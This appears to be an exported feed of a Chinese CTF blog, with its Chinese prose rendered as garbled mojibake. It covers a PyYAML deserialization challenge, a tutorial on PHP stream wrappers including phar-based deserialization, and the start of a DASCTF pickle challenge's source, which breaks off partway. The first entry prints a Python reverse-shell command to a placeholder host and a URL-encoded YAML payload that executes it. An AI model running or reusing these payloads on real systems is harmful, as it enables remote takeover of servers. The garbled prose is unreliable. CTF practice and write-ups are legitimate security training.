 uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br><br><br></code></pre></td></tr></table></figure><p>çœ‹æºç æ˜¯YAMLååºåˆ—åŒ–ã€‚ã€‚ã€‚ä¸å¤ªä¼šåé¢åº”è¯¥ä¼šå†™ä¸€ç¯‡åšå®¢å­¦ä¹ ä¸€ä¸‹ å‚è€ƒ<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</a></p><p>banäº†å¥½å¤šå¸¸è§„çš„å‡½æ•°å°è¯•ç»•è¿‡å§ï¼Œç¼–ç ç»•è¿‡</p><p>å¯ä»¥å‘ç°æ˜¯ç›´æ¥ä½¿ç”¨çš„<code>yaml.load</code>åº”è¯¥æ˜¯&lt;5.1ç‰ˆæœ¬çš„ï¼Œé«˜ç‰ˆæœ¬è¦ä½¿ç”¨æ„é€ å™¨</p><p>å¯ä»¥å‘ç°execå‡½æ•°æ˜¯æ²¡æœ‰è¿‡æ»¤çš„</p><p>å°è¯•ä½¿ç”¨execæ„å»ºè§£ç å™¨æ‰§è¡Œå‘½ä»¤</p><p>å‘½ä»¤ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;python3 -c \&#x27;</span>import os,pty,socket;s=socket.<span class="hljs-built_in">socket</span>();s.<span class="hljs-built_in">connect</span>((<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">32800</span>));[os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(),f)for f <span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.<span class="hljs-built_in">spawn</span>(<span class="hljs-string">&quot;sh&quot;</span>)\<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨urlç¼–ç ä¸Šä¼ æ‰§è¡Œå°±å¯ä»¥</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><span class="hljs-attr">args:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">exp</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/tuple</span> []<br>  <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;<br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;import urllib; exec(urllib.parse.unquote(&#x27;%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%69%70%22%2c%33%32%38%30%30%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>å­¦ä¹ å¤§ä½¬åšå®¢ï¼š </p><p><a href="https://www.tr0y.wang/s">https://www.tr0y.wang/s</a></p><p><a href="https://lisien11.xyz/">https://lisien11.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYAML</tag>
      
      <tag>ååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPä¼ªåè®®</title>
    <link href="/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>ä»‹ç»phpå¸¸è§çš„ä¼ªåè®®</p><h1 id="php-åè®®æ—"><a href="#php-åè®®æ—" class="headerlink" title="php:&#x2F;&#x2F; åè®®æ—"></a>php:&#x2F;&#x2F; åè®®æ—</h1><p>è¿™äº›åè®®ç”¨äºè®¿é—® PHP çš„è¾“å…¥&#x2F;è¾“å‡ºæµã€å†…å­˜ã€ä¸´æ—¶æ–‡ä»¶ç­‰èµ„æº</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong><code>php://input</code></strong></h2><p><strong>ç”¨é€”</strong>ï¼šè¯»å–åŸå§‹çš„ HTTP è¯·æ±‚ä½“æ•°æ®ï¼ˆå¦‚ POST,GET æ•°æ®ï¼‰</p><p><strong>å®ä¾‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rawData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><strong><code>php://filter</code></strong></h2><p><strong>ç”¨é€”</strong>ï¼šåœ¨è¯»å†™æ–‡ä»¶æ—¶åº”ç”¨è¿‡æ»¤å™¨ï¼ˆå¦‚ç¼–ç &#x2F;åŠ å¯†ï¼‰ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>php://filter/&lt;è¿‡æ»¤å™¨é“¾&gt;/resource=&lt;æ–‡ä»¶è·¯å¾„&gt;</code></p><p>å®˜æ–¹æ–‡æ¡£ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åç§° æè¿°<br><span class="hljs-attribute">resource</span>=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;     è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚<br><span class="hljs-attribute">read</span>=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;         è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚<br><span class="hljs-attribute">write</span>=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;    è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚<br>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;        ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å™¨ï¼š"><a href="#è¿‡æ»¤å™¨ï¼š" class="headerlink" title="è¿‡æ»¤å™¨ï¼š"></a>è¿‡æ»¤å™¨ï¼š</h3><h3 id="è½¬æ¢è¿‡æ»¤å™¨ï¼š"><a href="#è½¬æ¢è¿‡æ»¤å™¨ï¼š" class="headerlink" title="è½¬æ¢è¿‡æ»¤å™¨ï¼š"></a>è½¬æ¢è¿‡æ»¤å™¨ï¼š</h3><h4 id="convert-base64-encode-å’Œ-convert-base64-decode"><a href="#convert-base64-encode-å’Œ-convert-base64-decode" class="headerlink" title="convert.base64-encode å’Œ convert.base64-decode"></a>convert.base64-encode å’Œ convert.base64-decode</h4><p>å°†è¯»å–çš„æ•°æ®è¿›è¡Œbase64è½¬æ¢åè¾“å‡º</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode-å’Œ-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-å’Œ-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode å’Œ convert.quoted-printable-decode"></a>convert.quoted-printable-encode å’Œ convert.quoted-printable-decode</h4><p>å°†éasciiç çš„å€¼è½¬æ¢ä¸ºè½¬æ¢ä¸º <code>=XX</code> æ ¼å¼çš„ ASCII å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <code>XX</code> æ˜¯è¯¥å­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ã€‚</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;Hello, ä¸–ç•Œ! =&quot;</span>;<br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-encode/resource=data://text/plain,&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$text</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-comment">//Hello,=20=E4=B8=96=E7=95=8C!=20=3D ä¸­æ–‡è¢«è½¬æ¢</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>ä¾èµ– <code>iconv</code> æ‰©å±•ï¼Œéœ€ç¡®ä¿ PHP å·²å¯ç”¨è¯¥æ‰©å±•</p></blockquote><p><code>convert.iconv.*</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æµè¿‡æ»¤å™¨ï¼ˆStream Filterï¼‰ï¼Œç”¨äºåœ¨ä¸åŒå­—ç¬¦ç¼–ç ä¹‹é—´è¿›è¡Œè½¬æ¢</p><p><strong>è¿‡æ»¤å™¨æ ¼å¼</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">convert.iconv.&lt;è¾“å…¥ç¼–ç &gt;.&lt;è¾“å‡ºç¼–ç &gt;<br>æˆ–<br>convert.iconv.&lt;è¾“å‡ºç¼–ç &gt;/&lt;è¾“å…¥ç¼–ç &gt;<br></code></pre></td></tr></table></figure><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å°† UTF-8 å­—ç¬¦ä¸²å†™å…¥ä¸º GBK æ–‡ä»¶</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;ä½ å¥½ï¼Œä¸–ç•Œï¼&quot;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/write=convert.iconv.utf-8.gbk/resource=output.txt&#x27;</span>,<br>    <span class="hljs-variable">$text</span><br>);<br></code></pre></td></tr></table></figure><h3 id="é“¾å¼è¿‡æ»¤å™¨"><a href="#é“¾å¼è¿‡æ»¤å™¨" class="headerlink" title="é“¾å¼è¿‡æ»¤å™¨"></a><strong>é“¾å¼è¿‡æ»¤å™¨</strong></h3><p>ä¸åŒçš„è¿‡æ»¤å™¨å¯ä»¥ç”¨ç®¡é“ç¬¦è¿æ¥åšä¸€ä¸ªé“¾å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å…ˆè§£ç  Base64ï¼Œå†è½¬æ¢ç¼–ç ï¼ˆå‡è®¾åŸå§‹æ•°æ®æ˜¯ GBK ç¼–ç çš„ Base64ï¼‰</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/read=convert.base64-decode|convert.iconv.gbk.utf-8/resource=data.txt&#x27;</span><br>);<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><strong><code>zip://</code></strong></h1><p><strong>ç”¨é€”</strong>ï¼šè¯»å– ZIP å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>zip://&lt;å‹ç¼©åŒ…è·¯å¾„&gt;#&lt;å†…éƒ¨æ–‡ä»¶&gt;</code>ã€‚</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;zip://archive.zip#file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data://"></a><strong><code>data://</code></strong></h1><p><strong>ä»‹ç»</strong>ï¼šæ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p>allow_url_fopenå’Œallow_url_includeéƒ½éœ€è¦å¼€å¯ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>data:[&lt;MIMEç±»å‹&gt;][;base64],&lt;æ•°æ®&gt;</code>ã€‚</p><ul><li><strong>MIME ç±»å‹</strong>ï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šæ•°æ®çš„æ ¼å¼ï¼ˆå¦‚ <code>text/plain</code>, <code>image/png</code>ï¼‰ï¼Œé»˜è®¤æ˜¯ <code>text/plain</code>ã€‚</li><li><strong>base64</strong>ï¼ˆå¯é€‰æ ‡è®°ï¼‰ï¼šè¡¨ç¤ºæ•°æ®æ˜¯ Base64 ç¼–ç çš„ã€‚</li><li><strong>æ•°æ®</strong>ï¼šåŸå§‹å†…å®¹æˆ– Base64 ç¼–ç åçš„å†…å®¹ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>); <span class="hljs-comment">// è¾“å‡º &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><strong><code>phar://</code></strong></h1><p><strong>ç”¨é€”</strong>ï¼šè®¿é—® PHARï¼ˆPHP å½’æ¡£ï¼‰æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚</p><p><strong>è¯­æ³•</strong>ï¼š<code>phar://&lt;è·¯å¾„&gt;/file.phar/&lt;å†…éƒ¨æ–‡ä»¶&gt;</code>ã€‚</p><p><strong>ç”¨æ³•</strong>ï¼šåœ¨ååºåˆ—åŒ–å¯ä»¥ç”¨</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/fb3befe87ee638410501d54bc543c8f3.png" alt="æ¥è‡ªCSDNå—å—"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åˆ›å»ºå¹¶é…ç½® PHAR</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br> <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨pharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar&#x27;</span>;      <span class="hljs-comment">#pharåè®®ï¼Œphar.pharåŒ…ï¼Œ</span><br>  <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);     <span class="hljs-comment">#å—å½±å“çš„file_existså‡½æ•° è§¦å‘ååºåˆ—åŒ–</span><br></code></pre></td></tr></table></figure><h1 id="glob"><a href="#glob" class="headerlink" title="glob://"></a><strong><code>glob://</code></strong></h1><p><strong>ç”¨é€”</strong>ï¼šåŒ¹é…æ–‡ä»¶è·¯å¾„æ¨¡å¼ï¼ˆå¦‚éå†ç›®å½•ï¼‰ã€‚ä¸€èˆ¬é…åˆåŸç”Ÿç±»ä½¿ç”¨</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;glob:///path/*.txt&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.23</title>
    <link href="/2025/01/23/2025-1-23/"/>
    <url>/2025/01/23/2025-1-23/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-DASCTF-const-python"><a href="#2024-DASCTF-const-python" class="headerlink" title="2024 DASCTF const_python"></a>2024 DASCTF const_python</h1><p>æç¤ºè®¿é—®&#x2F;srcæ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span 